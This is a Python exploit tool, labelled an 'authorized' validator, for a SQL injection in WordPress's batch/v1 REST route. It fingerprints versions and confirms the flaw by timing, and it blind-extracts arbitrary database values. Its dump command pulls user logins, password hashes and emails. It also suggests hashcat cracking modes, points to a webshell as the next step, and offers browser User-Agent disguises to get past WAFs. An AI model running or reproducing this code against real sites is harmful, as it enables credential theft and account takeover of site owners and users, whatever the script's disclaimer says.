#!/usr/bin/env python3
"""
wp2shell_check.py — non-destructive validator for the WordPress batch/v1
route-confusion -> author__not_in SQL injection (CVE fixed in 7.0.2 / 6.9.5).

Authorized penetration testing / assurance use ONLY.

Subcommands:
  * version : fingerprint the WordPress version (GET only)
  * check   : confirm the SQLi via a time-based differential (non-destructive)
  * prove   : extract an arbitrary scalar (default @@version) via a
              boolean-over-time oracle, to demonstrate read control
  * dump    : extract credentials (wp_users: login/hash/email) as impact proof

Scope note: credential extraction is standard, expected evidence in an authorized
penetration test — it demonstrates real account-takeover impact, not just a code
path. Offline cracking of the recovered hashes and the plugin-upload webshell are
the logical next steps and exist in the public tool; this script stops at
credential recovery, which is the reportable impact. (WP 6.8+ stores $wp$2y$
bcrypt hashes, not legacy $P$ phpass — the tool reports the format it observed.)

Usage:
  ./wp2shell_check.py version <url>
  ./wp2shell_check.py check   <url> [--sleep 3] [--samples 3] [-k]
  ./wp2shell_check.py prove   <url> [--expr "@@version"] [--mode content|time] [-k]
  ./wp2shell_check.py dump    <url> [--table wp_users] [--rows 1] [--mode content|time] [-k]

Every subcommand accepts -A/--user-agent (preset chrome|firefox|safari|default, or
a literal UA) to blend in with browser traffic when a WAF blocks the default UA:
  ./wp2shell_check.py check <url> -A chrome

Extraction modes:
  content  (default, fast)  reads the boolean from the mis-dispatched posts
                            response in the nested batch body — ~1 request/test.
  time     (fallback)       IF(cond, SLEEP(n), 0), verdict from latency —
                            use when responses are cached/uniform or content
                            calibration fails (e.g. a site with 0 published posts).
"""
import argparse, json, re, ssl, statistics, sys, time
import urllib.parse, urllib.request, urllib.error

# The honest default identifies the tool; some customer WAFs block it outright,
# so --user-agent lets you blend in with normal browser traffic when authorized.
UA_DEFAULT = "wp2shell-assurance/1.0 (authorized-test)"
UA_PRESETS = {
    "default": UA_DEFAULT,
    "chrome":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "firefox": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) "
               "Gecko/20100101 Firefox/127.0",
    "safari":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
               "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
}
UA = UA_DEFAULT   # active value; overridden by --user-agent in main()


def resolve_ua(value):
    """Map a --user-agent value to a UA string: a preset name or a literal UA."""
    if not value:
        return UA_DEFAULT
    return UA_PRESETS.get(value.lower(), value)


def _ctx(insecure):
    return ssl._create_unverified_context() if insecure else None


def http_get(url, insecure=False, timeout=15):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx(insecure)) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def http_post_json(url, obj, insecure=False, timeout=30):
    data = json.dumps(obj).encode()
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"Content-Type": "application/json", "Accept": "application/json",
                 "User-Agent": UA})
    t0 = time.perf_counter()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx(insecure)) as r:
            body, code = r.read(), r.status
    except urllib.error.HTTPError as e:
        body, code = e.read(), e.code
    return code, body, time.perf_counter() - t0


# ---------------------------------------------------------------- payload build
def batch_url(base):
    return base.rstrip("/") + "/?rest_route=/batch/v1/"


def nested_batch(author_not_in_value):
    """Double-nested batch that desync-routes
    GET /wp/v2/users?author_exclude=<inj> into posts get_items()."""
    inj = urllib.parse.quote(author_not_in_value, safe="")
    inner = {"validation": "normal", "requests": [
        {"method": "POST", "path": "///"},
        {"method": "GET", "path": "/wp/v2/users?author_exclude=" + inj},
        {"method": "GET", "path": "/wp/v2/posts"},
    ]}
    return {"validation": "normal", "requests": [
        {"method": "POST", "path": "///"},
        {"method": "POST", "path": "/wp/v2/posts", "body": inner},
        {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
    ]}


def timed_inject(base, sql_fragment, samples=1, insecure=False):
    """author__not_in := '0) OR <sql_fragment>-- -'. Returns median wall time."""
    value = "0) OR %s-- -" % sql_fragment
    url = batch_url(base)
    out = []
    for _ in range(samples):
        _, _, dt = http_post_json(url, nested_batch(value), insecure=insecure)
        out.append(dt)
    return statistics.median(out)


# ------------------------------------------------------------------- subcommands
def cmd_version(base, insecure=False):
    hits = {}
    _, feed = http_get(base.rstrip("/") + "/feed/", insecure)
    m = re.search(r"wordpress\.org/\?v=([0-9.]+)", feed)
    if m:
        hits["feed"] = m.group(1)
    _, home = http_get(base.rstrip("/") + "/", insecure)
    m = re.search(r'meta name="generator" content="WordPress ([0-9.]+)"', home)
    if m:
        hits["meta"] = m.group(1)
    m = re.findall(r"ver=([0-9]+\.[0-9]+\.[0-9]+)", home)
    if m:
        hits["assets"] = sorted(set(m))
    _, readme = http_get(base.rstrip("/") + "/readme.html", insecure)
    m = re.search(r"Version ([0-9.]+)", readme)
    if m:
        hits["readme"] = m.group(1)
    print(json.dumps(hits, indent=2) if hits else "[-] version not disclosed")
    vals = [v for k, v in hits.items() if isinstance(v, str)]
    for v in vals:
        parts = tuple(int(x) for x in v.split("."))
        vuln = (6, 9, 0) <= parts <= (6, 9, 4) or (7, 0, 0) <= parts <= (7, 0, 1)
        print(f"[{'!' if vuln else '+'}] {v}: "
              f"{'VULNERABLE range' if vuln else 'outside known-vuln range'}")
    return hits


def cmd_check(base, sleep=3.0, samples=3, insecure=False):
    # warm up TLS/opcode caches so the first sample is not an outlier
    timed_inject(base, "SLEEP(0)", 1, insecure)
    t0 = timed_inject(base, "SLEEP(0)", samples, insecure)
    tn = timed_inject(base, "SLEEP(%g)" % sleep, samples, insecure)
    delta, thresh = tn - t0, max(0.75, sleep * 0.65)
    print(f"[i] baseline SLEEP(0)   median : {t0:.2f}s")
    print(f"[i] inject   SLEEP({sleep:g}) median : {tn:.2f}s")
    print(f"[i] delta {delta:.2f}s  (threshold {thresh:.2f}s)")
    if delta >= thresh:
        print("[+] VULNERABLE — injected SLEEP controlled server-side query time.")
        return True
    print("[-] NOT confirmed — patched (>=6.9.5/7.0.2), edge-blocked, or no batch route.")
    return False


# -------------------------------------------------------------------- oracles
# An "oracle" is a callable oracle(condition:str) -> bool that reports whether an
# arbitrary SQL boolean is true. Two implementations:
#   time    : IF(cond, SLEEP(n), 0) — one request per test, verdict from latency.
#   content : '0) AND (cond)-- -' — TRUE keeps posts visible, FALSE hides them;
#             read the mis-dispatched posts array out of the nested batch body.
# The content oracle is ~1 fast request per test (no sleeps) — dramatically faster.

def make_time_oracle(base, sleep, insecure):
    def oracle(condition):
        frag = "IF((%s),SLEEP(%g),0)" % (condition, sleep)
        return timed_inject(base, frag, 1, insecure) >= max(0.75, sleep * 0.6)
    return oracle


def _nested_rows(body):
    """Pull the mis-dispatched posts collection out of the nested batch envelope:
    outer.responses[1].body.responses[1].body  (each element is {body,status,headers})."""
    outer = json.loads(body)
    return outer["responses"][1]["body"]["responses"][1]["body"]


def make_content_oracle(base, insecure):
    url = batch_url(base)

    def oracle(condition):
        value = "0) AND (%s)-- -" % condition
        _, body, _ = http_post_json(url, nested_batch(value), insecure=insecure)
        try:
            rows = _nested_rows(body)
            return isinstance(rows, list) and len(rows) > 0
        except (KeyError, IndexError, TypeError, ValueError):
            return False
    return oracle


def calibrate(oracle):
    """Confirm the oracle distinguishes TRUE from FALSE before trusting it."""
    return oracle("1=1") and not oracle("1=2")


def build_oracle(base, mode, sleep, insecure):
    if mode == "content":
        o = make_content_oracle(base, insecure)
        if calibrate(o):
            print("[i] content oracle calibrated (fast path).")
            return o
        print("[!] content oracle failed calibration (site may have 0 published "
              "posts, or WAF); falling back to time oracle.")
    o = make_time_oracle(base, sleep, insecure)
    if not calibrate(o):
        print("[!] time oracle also failed calibration — target may be patched "
              "or unreachable; results unreliable.")
    else:
        print("[i] time oracle calibrated.")
    return o


# ----------------------------------------------------------------- extractors
def extract_scalar(oracle, expr, maxlen=64, charset=(32, 126), quiet=False):
    """Blind-extract a string scalar one char at a time (binary search)."""
    out = ""
    for pos in range(1, maxlen + 1):
        ch = "ASCII(SUBSTRING(COALESCE((%s),''),%d,1))" % (expr, pos)
        if oracle(ch + "=0"):                 # 0 => past end of string
            break
        lo, hi = charset
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle("%s>%d" % (ch, mid)):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        if not quiet:
            print(f"      [{pos:2d}] {out!r}")
    return out


def extract_int(oracle, expr, maxbits=24):
    """Blind-extract a bounded non-negative integer (binary search)."""
    lo, hi = 0, (1 << maxbits) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle("(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


# ----------------------------------------------------------------- subcommands
def cmd_prove(base, expr="@@version", mode="content", sleep=2.0, insecure=False):
    oracle = build_oracle(base, mode, sleep, insecure)
    print(f"[i] extracting scalar: {expr}")
    out = extract_scalar(oracle, expr)
    print(f"[+] {expr} = {out!r}")
    return out


def cmd_dump(base, table="wp_users", cols="ID,user_login,user_pass,user_email",
             rows=None, mode="content", sleep=2.0, insecure=False):
    """Extract credentials from the target DB (authorized pentest impact proof)."""
    oracle = build_oracle(base, mode, sleep, insecure)
    n = extract_int(oracle, "SELECT COUNT(*) FROM %s" % table, maxbits=20)
    print(f"[i] {table}: {n} row(s) readable")
    if not n:
        print("[-] no rows / table not reachable")
        return []
    if rows:
        n = min(n, rows)
    dumped = []
    for i in range(n):
        expr = ("SELECT CONCAT_WS(0x7c,%s) FROM %s ORDER BY ID LIMIT %d,1"
                % (cols, table, i))
        print(f"[i] row {i} ...")
        val = extract_scalar(oracle, expr)
        dumped.append(val)
        print(f"[+] {val}")
    print("\n== dumped rows (%s) ==" % cols)
    for row in dumped:
        print("  " + row)
    _advise_cracking(dumped)
    return dumped


def _hash_format(h):
    if h.startswith(("$P$", "$H$")):
        return "phpass (MD5-based, legacy <6.8) — hashcat -m 400"
    if h.startswith("$wp$"):
        return ("WordPress 6.8+ bcrypt ($wp$2y$: bcrypt over base64(sha384(pw))) — "
                "NOT -m 400; use your hashcat build's WordPress-bcrypt mode "
                "(strip/keep the $wp$ prefix per its docs)")
    if h.startswith(("$2y$", "$2b$", "$2a$")):
        return "bcrypt — hashcat -m 3200"
    return "unrecognised hash format — identify before cracking"


def _advise_cracking(dumped):
    seen = set()
    for row in dumped:
        parts = row.split("|")
        if len(parts) >= 3 and parts[2].startswith("$"):
            seen.add(_hash_format(parts[2]))
    if seen:
        print("\n[i] crack offline to demonstrate full account takeover:")
        for s in sorted(seen):
            print("      - " + s)


def main():
    p = argparse.ArgumentParser(description="Non-destructive validator for the "
                                            "WP batch/v1 -> author__not_in SQLi.")
    sub = p.add_subparsers(dest="cmd", required=True)
    for name in ("version", "check", "prove", "dump"):
        s = sub.add_parser(name)
        s.add_argument("url")
        s.add_argument("-k", "--insecure", action="store_true",
                       help="skip TLS verification (lab certs)")
        s.add_argument("-A", "--user-agent", default=None,
                       help="User-Agent: a preset (chrome/firefox/safari/default) "
                            "or a literal UA string. Default identifies the tool; "
                            "override to bypass WAFs that block it (authorized use).")
        if name == "check":
            s.add_argument("--sleep", type=float, default=3.0)
            s.add_argument("--samples", type=int, default=3)
        if name == "prove":
            s.add_argument("--expr", default="@@version",
                           help="SQL scalar to extract (default @@version)")
            s.add_argument("--mode", choices=("content", "time"), default="content",
                           help="content = fast (read response); time = blind SLEEP")
            s.add_argument("--sleep", type=float, default=2.0,
                           help="SLEEP seconds for time mode")
        if name == "dump":
            s.add_argument("--table", default="wp_users",
                           help="table to read (respect the DB prefix)")
            s.add_argument("--cols", default="ID,user_login,user_pass,user_email",
                           help="comma-separated columns")
            s.add_argument("--rows", type=int, default=None,
                           help="cap number of rows extracted")
            s.add_argument("--mode", choices=("content", "time"), default="content",
                           help="content = fast (read response); time = blind SLEEP")
            s.add_argument("--sleep", type=float, default=2.0,
                           help="SLEEP seconds for time mode")
    a = p.parse_args()
    global UA
    UA = resolve_ua(a.user_agent)
    if a.user_agent:
        print(f"[i] User-Agent: {UA}")
    if a.cmd == "version":
        cmd_version(a.url, a.insecure)
    elif a.cmd == "check":
        sys.exit(0 if cmd_check(a.url, a.sleep, a.samples, a.insecure) else 1)
    elif a.cmd == "prove":
        cmd_prove(a.url, a.expr, a.mode, a.sleep, a.insecure)
    elif a.cmd == "dump":
        cmd_dump(a.url, a.table, a.cols, a.rows, a.mode, a.sleep, a.insecure)


if __name__ == "__main__":
    main()
